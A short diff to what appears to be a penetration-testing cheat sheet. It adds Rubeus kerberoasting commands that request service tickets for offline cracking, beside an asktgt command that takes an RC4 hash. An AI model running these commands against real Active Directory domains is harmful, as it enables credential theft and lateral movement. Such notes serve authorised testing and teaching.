@@ -40,6 +40,8 @@ PS> .\Rubeus.exe asktgt /domain:xxx /user:xxx /rc4:xxx /nowrap
 Kerberoasting
 
 ```shell!
+PS> .\Rubeus.exe kerberoast /user:cn /nowrap # Request
+PS> .\Rubeus.exe kerberoast /domain:dev.example.com /user:cn /nowrap
 PS> .\Rubeus.exe kerberoast /stats # number of SPNs, encryption types
 PS> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap
 PS> .\Rubeus.exe kerberoast /user:cn /nowrap # cn encryption settings
